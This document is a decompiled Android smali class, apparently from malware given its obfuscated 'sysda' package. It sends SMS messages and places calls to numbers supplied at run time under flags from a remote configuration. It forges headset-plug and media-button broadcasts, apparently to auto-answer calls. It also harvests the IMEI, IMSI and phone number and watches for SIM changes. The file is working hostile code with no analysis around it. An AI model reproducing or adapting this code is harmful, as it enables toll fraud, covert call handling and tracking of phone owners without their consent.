.class public final Lsysda/f/e;
.super Ljava/lang/Object;


# static fields
.field public static a:J

.field public static final b:Ljava/util/ArrayList;

.field private static c:Landroid/telephony/TelephonyManager;

.field private static d:Z

.field private static e:I

.field private static f:Ljava/lang/String;

.field private static g:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    const/4 v1, 0x0

    const/4 v0, 0x0

    sput-object v0, Lsysda/f/e;->c:Landroid/telephony/TelephonyManager;

    sput-boolean v1, Lsysda/f/e;->d:Z

    sput v1, Lsysda/f/e;->e:I

    const-string v0, ""

    sput-object v0, Lsysda/f/e;->f:Ljava/lang/String;

    const-string v0, ""

    sput-object v0, Lsysda/f/e;->g:Ljava/lang/String;

    const-wide/16 v0, -0x1

    sput-wide v0, Lsysda/f/e;->a:J

    new-instance v0, Ljava/util/ArrayList;

    const/16 v1, 0xa

    invoke-direct {v0, v1}, Ljava/util/ArrayList;-><init>(I)V

    sput-object v0, Lsysda/f/e;->b:Ljava/util/ArrayList;

    return-void
.end method

.method static synthetic a(I)I
    .locals 0

    sput p0, Lsysda/f/e;->e:I

    return p0
.end method

.method public static a(Ljava/lang/String;)I
    .locals 5

    const/4 v0, 0x0

    const/16 v1, 0x64

    sget-object v2, Lsysda/h;->a:Lsysda/l;

    iget-object v2, v2, Lsysda/l;->B:Lsysda/i;

    iget-boolean v2, v2, Lsysda/i;->f:Z

    if-nez v2, :cond_0

    :goto_0
    return v0

    :cond_0
    if-eqz p0, :cond_1

    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v2

    const/4 v3, 0x3

    if-ge v2, v3, :cond_2

    :cond_1
    move v0, v1

    goto :goto_0

    :cond_2
    sget v2, Lsysda/f/e;->e:I

    if-eqz v2, :cond_3

    move v0, v1

    goto :goto_0

    :cond_3
    :try_start_0
    new-instance v2, Landroid/content/Intent;

    const-string v3, "android.intent.action.CALL"

    invoke-direct {v2, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "tel:"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v3

    invoke-virtual {v2, v3}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    const/high16 v3, 0x10000000

    invoke-virtual {v2, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-static {}, Lsysda/a;->a()Landroid/app/Application;

    move-result-object v3

    invoke-virtual {v3, v2}, Landroid/app/Application;->startActivity(Landroid/content/Intent;)V

    sget-object v2, Lsysda/f/e;->b:Ljava/util/ArrayList;

    invoke-virtual {v2, p0}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    move v0, v1

    goto :goto_0
.end method

.method public static a(Lsysda/f/h;)I
    .locals 8

    const/4 v6, 0x0

    const/16 v7, 0x64

    sget-object v0, Lsysda/h;->a:Lsysda/l;

    iget-object v0, v0, Lsysda/l;->B:Lsysda/i;

    iget-boolean v0, v0, Lsysda/i;->e:Z

    if-nez v0, :cond_0

    move v0, v6

    :goto_0
    return v0

    :cond_0
    if-eqz p0, :cond_1

    iget-object v0, p0, Lsysda/f/h;->b:Ljava/lang/String;

    if-eqz v0, :cond_1

    iget-object v0, p0, Lsysda/f/h;->b:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    const/4 v1, 0x2

    if-ge v0, v1, :cond_2

    :cond_1
    move v0, v7

    goto :goto_0

    :cond_2
    iget-object v0, p0, Lsysda/f/h;->a:Ljava/lang/String;

    if-eqz v0, :cond_3

    iget-object v0, p0, Lsysda/f/h;->a:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-nez v0, :cond_4

    :cond_3
    const-string v0, " "

    iput-object v0, p0, Lsysda/f/h;->a:Ljava/lang/String;

    :cond_4
    :try_start_0
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    if-nez v0, :cond_5

    move v0, v7

    goto :goto_0

    :cond_5
    iget-object v1, p0, Lsysda/f/h;->a:Ljava/lang/String;

    invoke-virtual {v0, v1}, Landroid/telephony/SmsManager;->divideMessage(Ljava/lang/String;)Ljava/util/ArrayList;

    move-result-object v3

    invoke-virtual {v3}, Ljava/util/ArrayList;->size()I

    move-result v1

    if-nez v1, :cond_6

    move v0, v7

    goto :goto_0

    :cond_6
    iget-object v1, p0, Lsysda/f/h;->b:Ljava/lang/String;

    const/4 v2, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendMultipartTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/util/ArrayList;Ljava/util/ArrayList;Ljava/util/ArrayList;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move v0, v6

    goto :goto_0

    :catch_0
    move-exception v0

    move v0, v7

    goto :goto_0
.end method

.method public static a()Ljava/lang/String;
    .locals 1

    sget-object v0, Lsysda/f/e;->g:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic a(Z)V
    .locals 0

    invoke-static {p0}, Lsysda/f/e;->b(Z)V

    return-void
.end method

.method public static b()Landroid/telephony/TelephonyManager;
    .locals 2

    sget-object v0, Lsysda/f/e;->c:Landroid/telephony/TelephonyManager;

    if-nez v0, :cond_0

    invoke-static {}, Lsysda/a;->a()Landroid/app/Application;

    move-result-object v0

    const-string v1, "phone"

    invoke-virtual {v0, v1}, Landroid/app/Application;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    sput-object v0, Lsysda/f/e;->c:Landroid/telephony/TelephonyManager;

    :cond_0
    sget-object v0, Lsysda/f/e;->c:Landroid/telephony/TelephonyManager;

    return-object v0
.end method

.method public static b(Ljava/lang/String;)V
    .locals 4

    sget-object v0, Lsysda/h;->a:Lsysda/l;

    iget-object v0, v0, Lsysda/l;->B:Lsysda/i;

    iget-boolean v0, v0, Lsysda/i;->f:Z

    if-nez v0, :cond_1

    :cond_0
    :goto_0
    return-void

    :cond_1
    if-eqz p0, :cond_0

    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v0

    const/4 v1, 0x3

    if-lt v0, v1, :cond_0

    const/4 v0, 0x1

    :try_start_0
    invoke-static {v0}, Lsysda/f/e;->b(Z)V

    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.intent.action.MEDIA_BUTTON"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    new-instance v1, Landroid/view/KeyEvent;

    const/4 v2, 0x0

    const/16 v3, 0x4f

    invoke-direct {v1, v2, v3}, Landroid/view/KeyEvent;-><init>(II)V

    const-string v2, "android.intent.extra.KEY_EVENT"

    invoke-virtual {v0, v2, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    invoke-static {}, Lsysda/a;->a()Landroid/app/Application;

    move-result-object v1

    const/4 v2, 0x0

    invoke-virtual {v1, v0, v2}, Landroid/app/Application;->sendOrderedBroadcast(Landroid/content/Intent;Ljava/lang/String;)V

    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.intent.action.MEDIA_BUTTON"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    new-instance v1, Landroid/view/KeyEvent;

    const/4 v2, 0x1

    const/16 v3, 0x4f

    invoke-direct {v1, v2, v3}, Landroid/view/KeyEvent;-><init>(II)V

    const-string v2, "android.intent.extra.KEY_EVENT"

    invoke-virtual {v0, v2, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    invoke-static {}, Lsysda/a;->a()Landroid/app/Application;

    move-result-object v1

    const/4 v2, 0x0

    invoke-virtual {v1, v0, v2}, Landroid/app/Application;->sendOrderedBroadcast(Landroid/content/Intent;Ljava/lang/String;)V

    sget-object v0, Lsysda/f/e;->b:Ljava/util/ArrayList;

    invoke-virtual {v0, p0}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method private static b(Z)V
    .locals 3

    :try_start_0
    new-instance v1, Landroid/content/Intent;

    const-string v0, "android.intent.action.HEADSET_PLUG"

    invoke-direct {v1, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/high16 v0, 0x40000000    # 2.0f

    invoke-virtual {v1, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const-string v2, "state"

    if-eqz p0, :cond_0

    const/4 v0, 0x1

    :goto_0
    invoke-virtual {v1, v2, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    const-string v0, "name"

    const-string v2, "Headset"

    invoke-virtual {v1, v0, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    invoke-static {}, Lsysda/a;->a()Landroid/app/Application;

    move-result-object v0

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/app/Application;->sendOrderedBroadcast(Landroid/content/Intent;Ljava/lang/String;)V

    sput-boolean p0, Lsysda/f/e;->d:Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_1
    return-void

    :cond_0
    const/4 v0, 0x0

    goto :goto_0

    :catch_0
    move-exception v0

    goto :goto_1
.end method

.method public static c()V
    .locals 4

    sget-object v0, Lsysda/f/e;->c:Landroid/telephony/TelephonyManager;

    if-nez v0, :cond_0

    invoke-static {}, Lsysda/a;->a()Landroid/app/Application;

    move-result-object v0

    const-string v1, "phone"

    invoke-virtual {v0, v1}, Landroid/app/Application;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    sput-object v0, Lsysda/f/e;->c:Landroid/telephony/TelephonyManager;

    :cond_0
    sget-object v0, Lsysda/f/e;->c:Landroid/telephony/TelephonyManager;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v0

    sget-object v1, Lsysda/f/e;->c:Landroid/telephony/TelephonyManager;

    invoke-virtual {v1}, Landroid/telephony/TelephonyManager;->getSubscriberId()Ljava/lang/String;

    move-result-object v1

    sget-object v2, Lsysda/f/e;->c:Landroid/telephony/TelephonyManager;

    invoke-virtual {v2}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v2

    if-eqz v0, :cond_1

    sput-object v0, Lsysda/f/e;->f:Ljava/lang/String;

    :goto_0
    sget-object v0, Lsysda/f/e;->f:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    const/16 v3, 0xf

    if-ge v0, v3, :cond_1

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Lsysda/f/e;->f:Ljava/lang/String;

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const/16 v3, 0x30

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v3, Lsysda/f/e;->f:Ljava/lang/String;

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lsysda/f/e;->f:Ljava/lang/String;

    goto :goto_0

    :cond_1
    if-eqz v2, :cond_2

    sput-object v2, Lsysda/f/e;->g:Ljava/lang/String;

    :cond_2
    if-eqz v1, :cond_4

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v0

    if-lez v0, :cond_4

    sget-object v0, Lsysda/h;->a:Lsysda/l;

    iget-object v0, v0, Lsysda/l;->r:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/String;->compareTo(Ljava/lang/String;)I

    move-result v0

    if-eqz v0, :cond_4

    sget-object v0, Lsysda/h;->a:Lsysda/l;

    iget-object v0, v0, Lsysda/l;->r:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-lez v0, :cond_3

    const/4 v0, 0x1

    const/4 v2, 0x2

    invoke-static {v0, v2}, Lsysda/e/a;->a(ZI)V

    :cond_3
    sget-object v0, Lsysda/h;->a:Lsysda/l;

    iput-object v1, v0, Lsysda/l;->r:Ljava/lang/String;

    invoke-static {}, Lsysda/h;->b()V

    :cond_4
    return-void
.end method

.method public static d()V
    .locals 2

    sget-object v0, Lsysda/f/e;->c:Landroid/telephony/TelephonyManager;

    if-nez v0, :cond_0

    invoke-static {}, Lsysda/a;->a()Landroid/app/Application;

    move-result-object v0

    const-string v1, "phone"

    invoke-virtual {v0, v1}, Landroid/app/Application;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    sput-object v0, Lsysda/f/e;->c:Landroid/telephony/TelephonyManager;

    :cond_0
    sget-object v0, Lsysda/f/e;->c:Landroid/telephony/TelephonyManager;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lsysda/f/e;->f:Ljava/lang/String;

    sget-object v0, Lsysda/f/e;->f:Ljava/lang/String;

    if-nez v0, :cond_2

    const-string v0, "000000000000000"

    sput-object v0, Lsysda/f/e;->f:Ljava/lang/String;

    :cond_1
    :goto_0
    return-void

    :cond_2
    :goto_1
    sget-object v0, Lsysda/f/e;->f:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    const/16 v1, 0xf

    if-ge v0, v1, :cond_3

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v1, Lsysda/f/e;->f:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const/16 v1, 0x30

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Lsysda/f/e;->f:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lsysda/f/e;->f:Ljava/lang/String;

    goto :goto_1

    :cond_3
    sget-object v0, Lsysda/h;->a:Lsysda/l;

    iget-object v0, v0, Lsysda/l;->s:Ljava/lang/String;

    if-eqz v0, :cond_4

    const-string v0, ""

    sget-object v1, Lsysda/h;->a:Lsysda/l;

    iget-object v1, v1, Lsysda/l;->s:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    :cond_4
    sget-object v0, Lsysda/h;->a:Lsysda/l;

    sget-object v1, Lsysda/f/e;->f:Ljava/lang/String;

    iput-object v1, v0, Lsysda/l;->s:Ljava/lang/String;

    invoke-static {}, Lsysda/h;->b()V

    goto :goto_0
.end method

.method static synthetic e()Z
    .locals 1

    sget-boolean v0, Lsysda/f/e;->d:Z

    return v0
.end method

.method static synthetic f()I
    .locals 1

    sget v0, Lsysda/f/e;->e:I

    return v0
.end method
